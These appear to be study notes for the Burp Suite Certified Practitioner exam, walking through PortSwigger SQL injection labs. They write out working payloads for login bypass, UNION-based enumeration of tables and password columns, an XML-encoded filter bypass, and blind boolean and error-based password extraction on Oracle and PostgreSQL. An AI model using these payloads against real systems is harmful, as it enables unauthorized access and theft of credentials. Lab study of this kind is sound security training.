[PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection),
[SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data 
- When user selects a category: `SELECT * FROM products WHERE category = 'Gifts' AND released = 1` /filter?category=Clothing%2c+shoes+and+accessories
- Solve the lab to display one or more unreleased products: `SELECT * FROM products WHERE category = '' OR 1=1 --'`/filter?category='+OR+1=1--
  - `--` is a comment indicator in SQL. Rest of the query is interpreted as a comment following this (effectively removing it). In this case, `AND released = 1` is removed. This could've been done just using the '--' to see unreleased items, but if you wanted to see unreleased items from all categories, the OR 1=1 --' works, as it is either Gifts or 1=1 is true, and since 1=1 is always true, the query returns all items.
 
## SQL injection vulnerability allowing login bypass
- When user logs in, there is a reported SQL vulnerability. Potential attempts to try include:
  - `SELECT firstname FROM users where username='administrator' and password='admin'`
  - `SELECT firstname FROM users where username=''' and password='admin'`
  - `SELECT firstname FROM users where username='administrator' --' and password='admin'` - WINNER

## SQL injection UNION attack, determining the number of columns returned by the query
- UNION attacks - retrieve data from other tables within the database. UNION allows for execution of additional SELECT queries: `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`
- Two requirements for UNION attacks:
  1. Individual queries must return the same number of columns (find out how many columns are being returned from the original query)
      - Inject a series of ORDER BY clauses and incrementing the specified column index until an error occurs. `' ORDER BY 1--`, `'ORDER BY 2--`, etc.
      - Inject a series of UNION SELECT payloads with different number of null values `' UNION SELECT NULL--`, `'UNION SELECT NULL,NULL--`, etc.
        - A NullPointerException makes this method ineffective. 
  2. The data types in each column must be compatible with the individual queries (find out which columns returned from the original query are of a suitable data type to hold the results from the injected query).
- In this lab, attempted `'+ORDER+BY+2--'` through 4 and noticed 4 returned an error. Determined there were three columns.
  - Verified 3 columns by also using `'+UNION+SELECT+NULL,NULL,NULL--'` (# of nulls has to match # of columns)
 
## SQL injection attack, querying the database type and version on Oracle
- You can identify the database type and version by injecting provider-specific queries:
  - Microsoft/MySQL: `SELECT @@version`
  - Oracle: `SELECT * FROM v$version`
  - PostgreSQL: `SELECT version()`
- For example, UNION attack with following input: `' UNION SELECT @@version--`
- **REMEMBER** - you need to determine the number of columns first before performing a UNION attack.
  - Performed `' ORDER BY 2--'` - determined 2 columns, as 3 returned an error (category='+ORDER+BY+2--')
- Once I determined 2 columns, I knew I needed to add an additional column to call for in my request: `' UNION SELECT banner,null FROM v&version--`
  - `' UNION SELECT banner,null FROM v$version--`
  - `' UNION SELECT version, null FROM v$instance--` did not work for this Oracle database. 

![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/cc5bd783-036f-4acc-9d71-c7452b4a7d63)

## SQL injection attack, querying the database type and version on MySQL and Microsoft
- Just like with Oracle, you need to figure out how many columns there are. Remember that comments are different - if you use `--` for MySQL, you must include a space after! `-- `
  - Determined number of columns by `' UNION SELECT NULL,NULL-- `, URL-encoded: `'+UNION+SELECT+NULL,NULL--+ ` (3 nulls returned an error)
      - Could also be done with `' ORDER BY 3 -- `
- The solution informs you to also determine the data returned by the column, which we will look at in the lab following this one.
- `'+UNION+SELECT+%40%40version,NULL--+` aka `' UNION SELECT @@version,null-- `

## SQL injection UNION attack, finding a column containing text
- Desired interesting data is often returned as a string, so you may need to find the one or more columns whose data type is compatible with strings. You can do this by probing columns:
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
- If the column type is not compatible with string data, a database error will likely be caused. If no error, and the response contains additional content like injected string value, relevant column is suitable for retrieving string data. 

![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/0cf51a15-ea3c-4b91-bab5-9136bd1540ec)

## SQL injection with filter bypass via XML encoding
- Different formats, such as JSON or XML, may provide you ways to obfuscate attacks that are otherwise blocked [Link](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-xml-encoding)
  - Can use the bApp extension Hackvertor to assist with encoding/decoding. 
- For example, the following XML-based SQL injection uses an XML escape sequence to encode the S character in SELECT [W3 UTF-8 Link](https://www.w3schools.com/charsets/ref_utf_basic_latin.asp):

```
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>

*The x indicates Hex for UTF-8 HTML, I believe*
```
- As for the lab, originally tried the following (UNION SELECT * FROM user--), which returned 0 units. Need to figure out how many columns maybe?:
```
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>8 &#x55;NION &#x53;ELECT &#42; &#x46;ROM users.tables&#x2D;&#x2D; </productId><storeId>2</storeId></stockCheck>
```
  - Changed it to UNION SELECT null - we see that it only likes to return one column at a time, so we have to concatenate. Both inputs were impacted here:
    
![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/57c4ece1-7ea1-45e4-9866-3cd178865088)
![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/9fa260e3-3ce6-47d4-bfbc-27d316a4bcdc)

## SQL injection attack, listing the database contents on non-Oracle databases
1. Determining how many columns by utilizing `' UNION SELECT NULL,NULL,NULL--` - returned an error, so reduced to 2 NULLs - WORKED! 2 columns.
   - Also can be achieved with `' ORDER BY 2--`
  2. We know it's a non-Oracle database, let's figure out what database it actually is. Remember to add a NULL because it is expecting 2 columns. 
   - Attempted: `'+UNION+SELECT+%40%40version,NULL--` for Microsoft/MySQL, received an error. `'+UNION+SELECT+version(),NULL--` for PostgreSQL returned:

![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/bacc2d5e-b305-4c3b-9975-39ab01389935)

3. Next, we need to find the table name. Note the table_name variable from the [cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) for PostgreSQL. Don't forget the NULL for the 2nd column! If you read through the list of table names, a few stand out, including users_jnmpco:

![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/0bb6f5e5-659c-4ba6-813d-74b8cd542b4f)

4. Investigate the columns by using the following `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_jnmpco'--` Note the following columns are returned: username_jwuwyw, email, and password_yermnb. Now we can call those columns directly with `' UNION SELECT username_jwuwyw,password_yermnb FROM users_jnmpco--`.

![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/73f2d88d-7f6e-4f18-a876-91b6df17ae9c)

## SQL injection attack, listing the database contents on Oracle
- Remember, since it's an Oracle database, every SELECT statement must specify a table to select FROM. There is a built-in table on Oracle called `dual` which you can use for this, so let's use `' UNION SELECT 'abc',NULL FROM dual` - our first guess of two columns was right!
- Grab the tables with `' UNION SELECT table_name,NULL FROM all_tables--` with help from the [cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet). Note table USERS_GVBORM.
- Grab the columns from this table with `' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'USERS_GVBORM'--`
![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/f416588a-d337-46bc-9bdd-a2641d8fb453)
- Use `' UNION SELECT USERNAME_PLXSAJ,PASSWORD_FSYMXF FROM USERS_GVBORM--` to grab the users and passwords. 

## SQL injection UNION attack, retrieving data from other tables
- Columns first, since it could also help me figure out database a bit (not Oracle if you don't need FROM). `' UNION SELECT NULL,NULL--` worked, 3 NULLs did not. 2 columns.
- Oh, this wasn't as complicated as expected. The prompt gives us the table and columns, so `' UNION SELECT username,password FROM users--` returned the administrator and the password. Lab solved! 

## SQL injection UNION attack, retrieving multiple values in a single column
- While it seems simple, as we identify two columns with `' UNION SELECT NULL, NULL--` and we are given the table name, users, along with the column names, password and username. However, when we attempt to call `' UNION SELECT username,password FROM users--`, we receive an error.
- Let's go back and test where we can get string data from. `' UNION SELECT 'abc',NULL FROM users--` returned an error, but `' UNION SELECT NULL,'abc' FROM users--` returned the value in a single column - we need to concat, like in lab **SQL injection with filter bypass via XML encoding**.
  ' UNION SELECT NULL,username || '~' || password FROM users--`

  ![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/c345be98-99da-468f-a847-cbe056a1b61f)

## Blind SQL injection with conditional responses
- You can extract part of a string, from a specified offset with a specified length. The index is 1-based. For example, each of the following expressions will return the string 'ba':
  - `SUBSTR('foobar', 4, 2)` - Oracle
  - `SUBSTRING('foobar', 4, 2)` - Microsoft
  - `SUBSTRING('foobar', 4, 2)` - PostgreSQL
  - `SUBSTRING('foobar', 4, 2)` - MySQL
1. Let's verify whether a 'Welcome Back' banner is triggered if we add `' AND '1'='1` to the TrackingId. Also verify that '1'='2 returns nothing:

![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/4245f3e7-f716-4f97-afb3-3ab9a26ecd6f)

2.  We can then verify that a table called users exists with `0s7Sc0dx14D3iJ8x' AND (SELECT 'whatever' from users LIMIT 1)='whatever` Now, let's verify that administrator exists with `0s7Sc0dx14D3iJ8x' AND (SELECT 'whatever' from users WHERE username='administrator')='whatever`.
3.  We can figure out the length by inserting an AND LENGTH clause, `0s7Sc0dx14D3iJ8x' AND (SELECT 'whatever' FROM users WHERE username='administrator' AND LENGTH(password)=20)='whatever`. We found it was 20 after iterating through >s. 

![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/f11d5925-f4dc-46e4-97b9-29c79c20a829)

4. Let's automate this! `0s7Sc0dx14D3iJ8x' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§`

![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/566cee97-0a17-4b33-a364-54794bec9089)

![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/b3753af3-f066-44bc-8d7b-eae9b7818010)
    
## Blind SQL injection with conditional errors
- Error-based SQL injection refers to cases where you're using error messages to extract or infer sensitive data from the database, even blind.
  - May be able to exploit using boolean expression, such as the way we exploited with conditional responses [previously](https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-conditional-errors)
  - May trigger error messages that output the data returned by the query. See ['Extracting sensitive data via verbose SQL error messages'](https://portswigger.net/web-security/sql-injection/blind#extracting-sensitive-data-via-verbose-sql-error-messages)
- If the application carries out SQL queries, but the behavior doesn't change (like the banner in the previous lab), different boolean conditions won't work because it makes no difference in the application's responses.
- Potentially possible to induce the application to return a different response depending on whether a SQL error occurs:
  - `xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a` ~ CASE expression evaluates to 'a', does not cause error
  - `XYZ' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)+'a` ~ 1/0 causes divide-by-zero error
- Need to determine what the error is and whether it is indicative of SQL processing. Thanks to the hint, we know this is an Oracle database:
  - Adding a single quotation mark gave us an error ('), while 2 quotation marks ('') did not cause an error - hint to SQL processing? Since we know it's Oracle,   let's attempt a subquery calling from the Oracle table, dual: `'||(SELECT '' FROM dual)||'` - Remember, since this is blind SQL injection, we can't use UNION attacks.
  - If you're having trouble envisioning what's going on with this concat, build out the strings -> `jLxqfFPoA20MH5Au'||(SELECT '' FROM dual)||'` is `'jLxqfFPoA20MH5Au'(SELECT '' FROM dual)''` -> || is appending one string to another string. You gotta account for the quotes that are automatically inserted by the application itself.
  - Inserting a fake table, such as `Z1xYCr6Y4IQXrVOI'||(SELECT '' FROM fake)||'` results in an Internal Server Error.
  - Let's try some test conditions:
    ` Z1xYCr6Y4IQXrVOI'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` results in an error, as 1=1, therefore the expression is evaluated to divide by zero, resulting in an error.
    `Z1xYCr6Y4IQXrVOI'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` results in no error, as 1 does not = 2, so the expression is ELSE'd to END FROM dual
    
![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/bf3e8f08-3071-447e-b132-1b2e9a5db829)

- We can find the length of the password by iterating through >s, finally landing on the length being 20: `TrackingId=7naEi4cPCofptQwj'||(SELECT CASE WHEN LENGTH(password)=20 THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')||';`
- After finding the length, I got stuck on this for a while because I was using SUBSTRING. I should've remembered it was an Oracle database - it's SUBSTR. `TrackingId=7naEi4cPCofptQwj'||(SELECT CASE WHEN SUBSTR(password,2,1)='l' THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')||';`
 
![image](https://github.com/user-attachments/assets/1ba3de6a-1d2f-40c9-a2d2-c1593d871d9d)


